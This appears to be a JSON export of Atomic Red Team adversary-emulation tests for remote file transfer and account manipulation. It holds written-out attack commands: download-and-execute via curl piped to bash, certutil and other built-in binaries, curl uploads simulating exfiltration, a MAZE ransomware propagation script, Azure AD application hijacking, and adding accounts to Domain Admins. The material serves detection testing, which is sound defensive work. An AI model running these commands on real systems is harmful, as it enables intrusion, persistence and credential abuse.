{"data": {"name": "scp remote file copy (push)", "shortName": "T1105", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Utilize scp to perform a remote file copy (push)\n\n\n**Supported Platforms:** linux, macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | remote_path | Remote path to receive scp | Path | /tmp/victim-files/ | \n | local_file | Path of file to copy | Path | /tmp/adversary-scp | \n | remote_host | Remote host to copy toward | String | victim-host | \n | username | User account to authenticate on remote host | String | victim | "}, "executionSteps": [{"description": "scp #{local_file} #{username}@#{remote_host}:#{remote_path}\n", "successCriteria": null}], "techniqueIds": ["clacwm6rd03sh29mqg9olase1", "clacwm1yx00gw29mqcl4h79oe"], "tags": []}, {"data": {"name": "scp remote file copy (pull)", "shortName": "T1105", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Utilize scp to perform a remote file copy (pull)\n\n\n**Supported Platforms:** linux, macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | remote_host | Remote host to copy from | String | adversary-host | \n | local_path | Local path to receive scp | Path | /tmp/victim-files/ | \n | remote_file | Path of file to copy | Path | /tmp/adversary-scp | \n | username | User account to authenticate on remote host | String | adversary | "}, "executionSteps": [{"description": "scp #{username}@#{remote_host}:#{remote_file} #{local_path}\n", "successCriteria": null}], "techniqueIds": ["clacwm6rd03sh29mqg9olase1", "clacwm1yx00gw29mqcl4h79oe"], "tags": []}, {"data": {"name": "rsync remote file copy (push)", "shortName": "T1105", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Utilize rsync to perform a remote file copy (push)\n\n\n**Supported Platforms:** linux, macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | remote_path | Remote path to receive rsync | Path | /tmp/victim-files | \n | remote_host | Remote host to copy toward | String | victim-host | \n | local_path | Path of folder to copy | Path | /tmp/adversary-rsync/ | \n | username | User account to authenticate on remote host | String | victim | "}, "executionSteps": [{"description": "rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}\n", "successCriteria": null}], "techniqueIds": ["clacwm6rd03sh29mqg9olase1", "clacwm1yx00gw29mqcl4h79oe"], "tags": []}, {"data": {"name": "rsync remote file copy (pull)", "shortName": "T1105", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Utilize rsync to perform a remote file copy (pull)\n\n\n**Supported Platforms:** linux, macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | remote_path | Path of folder to copy | Path | /tmp/adversary-rsync/ | \n | remote_host | Remote host to copy from | String | adversary-host | \n | local_path | Local path to receive rsync | Path | /tmp/victim-files | \n | username | User account to authenticate on remote host | String | adversary | "}, "executionSteps": [{"description": "rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}\n", "successCriteria": null}], "techniqueIds": ["clacwm6rd03sh29mqg9olase1", "clacwm1yx00gw29mqcl4h79oe"], "tags": []}, {"data": {"name": "Printer Migration Command-Line Tool UNC share folder into a zip file", "shortName": "T1105", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Create a ZIP file from a folder in a remote drive\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | Path_unc | Path to the UNC folder | Path | \\\\127.0.0.1\\c$\\AtomicRedTeam\\atomics\\T1105\\src\\ | \n | Path_PrintBrm | Path to PrintBrm.exe | Path | C:\\Windows\\System32\\spool\\tools\\PrintBrm.exe | "}, "executionSteps": [{"description": "del %TEMP%\\PrintBrm.zip >nul 2>&1 \n#{Path_PrintBrm} -b -d #{Path_unc}  -f %TEMP%\\PrintBrm.zip -O FORCE\n", "successCriteria": null}], "techniqueIds": ["clacwm6rd03sh29mqg9olase1"], "tags": []}, {"data": {"name": "OSTAP Worming Activity", "shortName": "T1105", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "OSTap copies itself in a specfic way to shares and secondary drives. This emulates the activity.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | destination_path | Path to create remote file at. Default is local admin share. | String | \\\\localhost\\C$ | "}, "executionSteps": [{"description": "pushd #{destination_path}\necho var fileObject = WScript.createobject(\"Scripting.FileSystemObject\");var newfile = fileObject.CreateTextFile(\"AtomicTestFileT1105.js\", true);newfile.WriteLine(\"This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives.\");newfile.Close(); > AtomicTestT1105.js\nCScript.exe AtomicTestT1105.js //E:JScript\ndel AtomicTestT1105.js /Q >nul 2>&1\ndel AtomicTestFileT1105.js /Q >nul 2>&1\npopd\n", "successCriteria": null}], "techniqueIds": ["clacwm6rd03sh29mqg9olase1", "clacwm1yx00gw29mqcl4h79oe"], "tags": []}, {"data": {"name": "Nimgrab - Transfer Files", "shortName": "T1105", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Use nimgrab.exe to download a file from the web. \n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | remote_file | URL of file to copy | Url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt | \n | destination_path | Destination path to file | Path | $env:TEMP\\Atomic-license.txt | \n | local_nimgrab | Local path to nimgrab | Path | $env:TEMP\\nimgrab.exe | "}, "executionSteps": [{"description": "cmd /c nimgrab.exe #{remote_file} #{destination_path}\n", "successCriteria": null}], "techniqueIds": ["clacwm6rd03sh29mqg9olase1"], "tags": []}, {"data": {"name": "MAZE Propagation Script", "shortName": "T1105", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test simulates MAZE ransomware's propogation script that searches through a list of computers, tests connectivity to them, and copies a binary file to the Windows\\Temp directory of each one. \nUpon successful execution, a specified binary file will attempt to be copied to each online machine, a list of the online machines, as well as a list of offline machines will be output to a specified location.\nReference: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html \n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | binary_file | Binary file to copy to remote machines | string | $env:comspec | \n | exe_remote_folder | Path to store executable on remote machine (no drive letter) | String | \\Windows\\Temp\\T1105.exe | \n | remote_drive_letter | Remote drive letter | String | C | "}, "executionSteps": [{"description": "$machine_list = \"$env:temp\\T1105MachineList.txt\"\n$offline_list = \"$env:temp\\T1105OfflineHosts.txt\"\n$completed_list = \"$env:temp\\T1105CompletedHosts.txt\"\nforeach ($machine in get-content -path \"$machine_list\")\n{if (test-connection -Count 1 -computername $machine -quiet) \n{cmd /c copy \"#{binary_file}\" \"\\\\$machine\\#{remote_drive_letter}$#{exe_remote_folder}\"\necho $machine >> \"$completed_list\"\nwmic /node: \"$machine\" process call create \"regsvr32.exe /i #{remote_drive_letter}:#{exe_remote_folder}\"}\nelse\n{echo $machine >> \"$offline_list\"}}\n", "successCriteria": null}], "techniqueIds": ["clacwm6rd03sh29mqg9olase1"], "tags": []}, {"data": {"name": "Lolbas replace.exe use to copy UNC file", "shortName": "T1105", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Copy UNC file to destination\nReference: https://lolbas-project.github.io/lolbas/Binaries/Replace/\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | replace_cab | UNC Path to the cab file | Path | \\\\127.0.0.1\\c$\\AtomicRedTeam\\atomics\\T1105\\src\\redcanary.cab | \n | Path_replace | Path to replace.exe | Path | C:\\Windows\\System32\\replace.exe | "}, "executionSteps": [{"description": "del %TEMP%\\redcanary.cab >nul 2>&1\n#{Path_replace} #{replace_cab} %TEMP% /A\n", "successCriteria": null}], "techniqueIds": ["clacwm6rd03sh29mqg9olase1"], "tags": []}, {"data": {"name": "Lolbas replace.exe use to copy file", "shortName": "T1105", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Copy file.cab to destination\nReference: https://lolbas-project.github.io/lolbas/Binaries/Replace/\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | replace_cab | Path to the cab file | Path | PathToAtomicsFolder\\T1105\\src\\redcanary.cab | \n | Path_replace | Path to replace.exe | Path | C:\\Windows\\System32\\replace.exe | "}, "executionSteps": [{"description": "del %TEMP%\\redcanary.cab >nul 2>&1\n#{Path_replace} #{replace_cab} %TEMP% /A\n", "successCriteria": null}], "techniqueIds": ["clacwm6rd03sh29mqg9olase1"], "tags": []}, {"data": {"name": "Linux Download File and Run", "shortName": "T1105", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Utilize linux Curl to download a remote file, chmod +x it and run it.\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | remote_url | url of remote payload | string | https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/ | \n | payload_name | payload name | string | atomic.sh | "}, "executionSteps": [{"description": "curl -sO #{remote_url}; chmod +x #{payload_name} | bash #{payload_name}\n", "successCriteria": null}], "techniqueIds": ["clacwm6rd03sh29mqg9olase1"], "tags": []}, {"data": {"name": "File download with finger.exe on Windows", "shortName": "T1105", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Simulate a file download using finger.exe. Connect to localhost by default, use custom input argument to test finger connecting to an external server.\nBecause this is being tested on the localhost, you should not be expecting a successful connection\nhttps://www.exploit-db.com/exploits/48815\nhttps://www.bleepingcomputer.com/news/security/windows-10-finger-command-can-be-abused-to-download-or-steal-files/\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | remote_host | Remote hostname or IP address | String | localhost | "}, "executionSteps": [{"description": "finger base64_filedata@#{remote_host}\n", "successCriteria": null}], "techniqueIds": ["clacwm6rd03sh29mqg9olase1"], "tags": []}, {"data": {"name": "File Download via PowerShell", "shortName": "T1105", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Use PowerShell to download and write an arbitrary file from the internet. Example is from the 2021 Threat Detection Report by Red Canary.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | target_remote_file | File to download | Url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt | \n | output_file | File to write to | String | LICENSE.txt | "}, "executionSteps": [{"description": "(New-Object Net.WebClient).DownloadString('#{target_remote_file}') | Out-File #{output_file}; Invoke-Item #{output_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm6rd03sh29mqg9olase1"], "tags": []}, {"data": {"name": "Download a File with Windows Defender MpCmdRun.exe", "shortName": "T1105", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Uses Windows Defender MpCmdRun.exe to download a file from the internet (must have version 4.18 installed).\nThe input arguments \"remote_file\" and \"local_path\" can be used to specify the download URL and the name of the output file.\nBy default, the test downloads the Atomic Red Team license file to the temp directory.\n\nMore info and how to find your version can be found here https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | remote_file | URL of file to download | Url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt | \n | local_path | Location to save downloaded file | Path | %temp%\\Atomic-license.txt | "}, "executionSteps": [{"description": "cd \"%ProgramData%\\Microsoft\\Windows Defender\\platform\\4.18*\"\nMpCmdRun.exe -DownloadFile -url #{remote_file} -path #{local_path}\n", "successCriteria": null}], "techniqueIds": ["clacwm6rd03sh29mqg9olase1", "clacwm1yx00gw29mqcl4h79oe"], "tags": []}, {"data": {"name": "Download a file with Microsoft Connection Manager Auto-Download", "shortName": "T1105", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Uses the cmdl32 to download arbitrary file from the internet. The cmdl32 package is allowed to install the profile used to launch the VPN connection. However, the config is modified to download the arbitary file. \nThe issue of cmdl32.exe detecting and deleting the payload by identifying it as not a VPN Servers profile is avoided by setting a temporary TMP folder and denying the delete permission to all files for the user.\nUpon successful execution the test will open calculator and Notepad executable for 10 seconds.\nreference:\nhttps://twitter.com/ElliotKillick/status/1455897435063074824\nhttps://github.com/LOLBAS-Project/LOLBAS/pull/151\nhttps://lolbas-project.github.io/lolbas/Binaries/Cmdl32/\nhttps://strontic.github.io/xcyclopedia/library/cmdl32.exe-FA1D5B8802FFF4A85B6F52A52C871BBB.html\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | Path_to_file | Path to the Batch script | Path | PathToAtomicsFolder\\T1105\\src\\T1105.bat | "}, "executionSteps": [{"description": "#{Path_to_file} 1>NUL \n", "successCriteria": null}], "techniqueIds": ["clacwm6rd03sh29mqg9olase1"], "tags": []}, {"data": {"name": "Download a file with IMEWDBLD.exe", "shortName": "T1105", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Use IMEWDBLD.exe (built-in to windows) to download a file. This will throw an error for an invalid dictionary file.\nDownloaded files can be found in \"%LocalAppData%\\Microsoft\\Windows\\INetCache\\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>\" or `%LocalAppData%\\Microsoft\\Windows\\INetCache\\IE\\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>.\nRun \"Get-ChildItem -Path C:\\Users\\<USERNAME>\\AppData\\Local\\Microsoft\\Windows\\INetCache\\ -Include <FILENAME>* -Recurse -Force -File -ErrorAction SilentlyContinue\" without quotes and adding the correct username and file name to locate the file.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | remote_url | Location of file to be downloaded. | url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml | \n | file_name | Name of the file to be downloaded without extension. | string | T1105 | "}, "executionSteps": [{"description": "$imewdbled = $env:SystemRoot + \"\\System32\\IME\\SHARED\\IMEWDBLD.exe\"\n& $imewdbled #{remote_url}\n", "successCriteria": null}], "techniqueIds": ["clacwm6rd03sh29mqg9olase1"], "tags": []}, {"data": {"name": "Download a file using wscript", "shortName": "T1105", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Use wscript to run a local VisualBasic file to download a remote file\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | vbscript_file | Full path to the VisualBasic downloading the file | String | PathToAtomicsFolder\\T1105\\src\\T1105-download-file.vbs | "}, "executionSteps": [{"description": "wscript.exe #{vbscript_file}", "successCriteria": null}], "techniqueIds": ["clacwm6rd03sh29mqg9olase1"], "tags": []}, {"data": {"name": "Curl Upload File", "shortName": "T1105", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The following Atomic utilizes native curl.exe, or downloads it if not installed, to upload a txt file to simulate data exfiltration\nExpected output will include whether the file uploaded successfully or not.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | curl_path | path to curl.exe | Path | C:\\Windows\\System32\\Curl.exe | \n | remote_destination | Remote destination | String | www.example.com | \n | file_path | File to upload | String | c:\\temp\\atomictestfile.txt | "}, "executionSteps": [{"description": "#{curl_path} -T #{file_path} #{remote_destination}\n#{curl_path} --upload-file #{file_path} #{remote_destination}\n#{curl_path} -d #{file_path} #{remote_destination}\n#{curl_path} --data #{file_path} #{remote_destination}\n", "successCriteria": null}], "techniqueIds": ["clacwm6rd03sh29mqg9olase1"], "tags": []}, {"data": {"name": "Curl Download File", "shortName": "T1105", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The following Atomic utilizes native curl.exe, or downloads it if not installed, to download a remote DLL and output to a number of directories to simulate malicious behavior.\nExpected output will include whether the file downloaded successfully or not.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | file_download | File to download | String | https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll | \n | curl_path | path to curl.exe | Path | C:\\Windows\\System32\\Curl.exe | "}, "executionSteps": [{"description": "#{curl_path} -k #{file_download} -o c:\\users\\public\\music\\allthethingsx64.dll\n#{curl_path} -k #{file_download} --output c:\\users\\public\\music\\allthethingsx64.dll\n#{curl_path} -k #{file_download} -o c:\\programdata\\allthethingsx64.dll\n#{curl_path} -k #{file_download} -o %Temp%\\allthethingsx64.dll\n", "successCriteria": null}], "techniqueIds": ["clacwm6rd03sh29mqg9olase1"], "tags": []}, {"data": {"name": "certutil download (verifyctl)", "shortName": "T1105", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Use certutil -verifyctl argument to download a file from the web. Note - /verifyctl also works!\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | remote_file | URL of file to copy | Url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt | \n | local_path | Local path to place file | Path | Atomic-license.txt | "}, "executionSteps": [{"description": "$datePath = \"certutil-$(Get-Date -format yyyy_MM_dd)\"\nNew-Item -Path $datePath -ItemType Directory\nSet-Location $datePath\ncertutil -verifyctl -split -f #{remote_file}\nGet-ChildItem | Where-Object {$_.Name -notlike \"*.txt\"} | Foreach-Object { Move-Item $_.Name -Destination #{local_path} }\n", "successCriteria": null}], "techniqueIds": ["clacwm6rd03sh29mqg9olase1", "clacwm1yx00gw29mqcl4h79oe"], "tags": []}, {"data": {"name": "certutil download (urlcache)", "shortName": "T1105", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Use certutil -urlcache argument to download a file from the web. Note - /urlcache also works!\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | remote_file | URL of file to copy | Url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt | \n | local_path | Local path to place file | Path | Atomic-license.txt | "}, "executionSteps": [{"description": "cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}\n", "successCriteria": null}], "techniqueIds": ["clacwm6rd03sh29mqg9olase1", "clacwm1yx00gw29mqcl4h79oe"], "tags": []}, {"data": {"name": "certreq download", "shortName": "T1105", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Use certreq to download a file from the web\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | local_path | Local path to place file | String | %temp%\\Atomic-license.txt | \n | remote_file | URL of file to copy | url | https://example.com | "}, "executionSteps": [{"description": "certreq.exe -Post -config #{remote_file} c:\\windows\\win.ini #{local_path}", "successCriteria": null}], "techniqueIds": ["clacwm6rd03sh29mqg9olase1"], "tags": []}, {"data": {"name": "Modify SSH Authorized Keys", "shortName": "T1098.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify contents of <user-home>/.ssh/authorized_keys to maintain persistence on victim host. \nIf the user is able to save the same contents in the authorized_keys file, it shows user can modify the file.\n\n\n**Supported Platforms:** macos, linux\n\n"}, "executionSteps": [{"description": "if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo $ssh_authorized_keys > ~/.ssh/authorized_keys; fi;\n", "successCriteria": null}], "techniqueIds": ["clacwm68q037h29mq6w77ac1f", "clacwm2de00s029mq0pxmduu6"], "tags": []}, {"data": {"name": "Azure AD Application Hijacking - Service Principal", "shortName": "T1098.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Add a certificate to an Application through its Service Principal.\nThe certificate can then be used to authenticate as the application and benefit from its rights.\nAn account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.\n\n\n**Supported Platforms:** azure-ad\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | username | Azure AD username | String | jonh@contoso.com | \n | password | Azure AD password | String | p4sswd | \n | service_principal_name | Name of the targeted service principal | String | SuperSP | \n | certificate_password | Password of the new certificate | String | Passw0rd | \n | path_to_cert | Path of the new certificate, locally stored | String | $env:TEMP | "}, "executionSteps": [{"description": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential\n\n$sp = Get-AzureADServicePrincipal -Searchstring \"#{service_principal_name}\"\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\n# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\n$certNotAfter = (Get-Date).AddDays(2)\n$credNotAfter = (Get-Date).AddDays(1)\n$thumb = (New-SelfSignedCertificate -DnsName \"atomicredteam.example.com\" -FriendlyName \"AtomicCert\" -CertStoreLocation \"cert:\\CurrentUser\\My\" -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter).Thumbprint\n$pwd = ConvertTo-SecureString -String \"#{certificate_password}\" -Force -AsPlainText\nExport-PfxCertificate -cert \"cert:\\CurrentUser\\my\\$thumb\" -FilePath \"#{path_to_cert}\\#{service_principal_name}.pfx\" -Password $pwd\n\n$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate(\"#{path_to_cert}\\#{service_principal_name}.pfx\", $pwd)\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\n\nNew-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"AtomicTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\n\nStart-Sleep -s 30\n$tenant=Get-AzureADTenantDetail\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $thumb\nWrite-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"\nWrite-Host \"End of Hijacking\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6dx03d229mq1kqcefzv"], "tags": []}, {"data": {"name": "Azure AD Application Hijacking - App Registration", "shortName": "T1098.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Add a certificate to an Application through its App Registration.\nThe certificate can then be used to authenticate as the application and benefit from its rights.\nAn account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.\n\n\n**Supported Platforms:** azure-ad\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | username | Azure AD username | String | jonh@contoso.com | \n | password | Azure AD password | String | p4sswd | \n | application_name | Name of the targeted application | String | SuperApp | \n | certificate_password | Password of the new certificate | String | Passw0rd | \n | path_to_cert | Path of the new certificate, locally stored | String | $env:TEMP | "}, "executionSteps": [{"description": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential\n\n$app = Get-AzureADApplication -Searchstring \"#{application_name}\"\nif ($app -eq $null) { Write-Warning \"Application not found\"; exit }\n$certNotAfter = (Get-Date).AddDays(2)\n$credNotAfter = (Get-Date).AddDays(1)\n$thumb = (New-SelfSignedCertificate -DnsName \"atomicredteam.example.com\" -FriendlyName \"AtomicCert\" -CertStoreLocation \"cert:\\CurrentUser\\My\" -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter).Thumbprint\n$pwd = ConvertTo-SecureString -String \"#{certificate_password}\" -Force -AsPlainText\nExport-PfxCertificate -cert \"cert:\\CurrentUser\\my\\$thumb\" -FilePath \"#{path_to_cert}\\#{application_name}.pfx\" -Password $pwd\n\n$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate(\"#{path_to_cert}\\#{application_name}.pfx\", $pwd)\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\n\nNew-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"AtomicTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\n\nStart-Sleep -s 30\n$tenant=Get-AzureADTenantDetail\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $thumb\nWrite-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"\nWrite-Host \"End of Hijacking\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6dx03d229mq1kqcefzv"], "tags": []}, {"data": {"name": "AWS - Create Access Key and Secret Key", "shortName": "T1098.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Adversaries create their own new access and secret keys to programatically interact with AWS environment, which is already compromised\n\n\n**Supported Platforms:** iaas:aws\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | username | Create new AWS access and secret keys for the user | String | atomicredteam | "}, "executionSteps": [{"description": "aws iam create-access-key --user-name #{username} > $PathToAtomicsFolder/T1098.001/bin/aws_secret.creds\ncd $PathToAtomicsFolder/T1098.001/bin/\n./aws_secret.sh\n", "successCriteria": null}], "techniqueIds": ["clacwm6dx03d229mq1kqcefzv"], "tags": []}, {"data": {"name": "Password Change on Directory Service Restore Mode (DSRM) Account", "shortName": "T1098", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Change the password on the Directory Service Restore Mode (DSRM) account using ntdsutil by syncing to existing account\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | sync_account | Account to sync password from | String | %username% | "}, "executionSteps": [{"description": "ntdsutil \"set dsrm password\" \"sync from domain account #{sync_account}\" \"q\" \"q\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6gi03g729mqabj30o2k"], "tags": []}, {"data": {"name": "Domain Account and Group Manipulate", "shortName": "T1098", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Create a random atr-nnnnnnnn account and add it to a domain group (by default, Domain Admins). \n\nThe quickest way to run it is against a domain controller, using `-Session` of `Invoke-AtomicTest`. Alternatively,\nyou need to install PS Module ActiveDirectory (in prereqs) and run the script with appropriare AD privileges to \ncreate the user and alter the group. Automatic installation of the dependency requires an elevated session, \nand is unlikely to work with Powershell Core (untested).\n\nIf you consider running this test against a production Active Directory, the good practise is to create a dedicated\nservice account whose delegation is given onto a dedicated OU for user creation and deletion, as well as delegated\nas group manager of the target group.\n\nExample: `Invoke-AtomicTest -Session $session 'T1098' -TestNames \"Domain Account and Group Manipulate\" -InputArgs @{\"group\" = \"DNSAdmins\" }`\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | account_prefix | Prefix string of the random username (by default, atr-). Because the cleanup deletes such account based on\na match `(&(samaccountname=#{account_prefix}-*)(givenName=Test))`, if you are to change it, be careful.\n | String | atr- | \n | group | Name of the group to alter | String | Domain Admins | \n | create_args | Additional string appended to New-ADUser call | String |  | "}, "executionSteps": [{"description": "$x = Get-Random -Minimum 2 -Maximum 99\n$y = Get-Random -Minimum 2 -Maximum 99\n$z = Get-Random -Minimum 2 -Maximum 99\n$w = Get-Random -Minimum 2 -Maximum 99\n\nImport-Module ActiveDirectory\n$account = \"#{account_prefix}-$x$y$z\"\nNew-ADUser -Name $account -GivenName \"Test\" -DisplayName $account -SamAccountName $account -Surname $account -Enabled:$False #{create_args}\nAdd-ADGroupMember \"#{group}\" $account\n", "successCriteria": null}], "techniqueIds": ["clacwm6gi03g729mqabj30o2k", "clacwm1b6001e29mqb4rf3u68"], "tags": []}, {"data": {"name": "AzureAD - adding permission to application", "shortName": "T1098", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The adversarie want to add permission to new created application. Application could be then use for persistence or for further operation in the attacked infrastructure. Permissions like AppRoleAssignment.ReadWrite.All or RoleManagement.ReadWrite.Directory in particular can be a valuable target for a threat actor.\nYou can use Get-AzureADApplication instead New-AzureADServicePrincipal to use an existing application.\nThe DirectoryRecommendations.Read.All permissions have been selected as the default\n\nThe account you use to run the PowerShell command should have Global Administrator/Application Administrator/Cloud Application Administrator role in your Azure AD.\n\nDetection hint - check Operation Name \"Add app role assignment to service principal\" in subscriptions Activity Logs.\nYou can also take a look at the materials:\nhttps://learnsentinel.blog/2022/01/04/azuread-privesc-sentinel/\nhttps://github.com/reprise99/Sentinel-Queries\nhttps://docs.google.com/presentation/d/1AWx1w0Xcq8ENvOmSjAJswEgEio-il09QWZlGg9PbHqE/edit#slide=id.g10460eb209c_0_2766\nhttps://gist.github.com/andyrobbins/7c3dd62e6ed8678c97df9565ff3523fb\n\n\n**Supported Platforms:** azure-ad\n\n**Inputs:**\n\n | Name | Description | 